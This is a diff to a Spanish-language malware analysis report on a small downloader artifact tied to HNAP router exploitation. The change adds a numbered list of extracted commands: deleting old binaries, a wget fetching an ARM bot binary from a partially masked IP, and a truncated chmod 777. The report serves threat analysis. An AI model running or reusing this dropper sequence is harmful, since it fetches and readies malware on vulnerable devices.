@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 387 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `SetAccessPointMode` en `hxxp://purenetworks[.]com/HNAP1/SetAccessPointMode`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 387 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `SetAccessPointMode` en `hxxp://purenetworks[.]com/HNAP1/SetAccessPointMode`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `rm main_arm main_arm7 arm7 arm`
+2. `wget http:/\/201.51.13.XXX/main_arm7`
+3. `chmod 777 mai` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15.md](../../../../../malware-like/oraculo/downloader/3a4a6ab237c49d0d4287b6723e458791e80cf4a852ce00413855d52c25e31f15.md)
 
 
 ## 🏷️ Clasificación
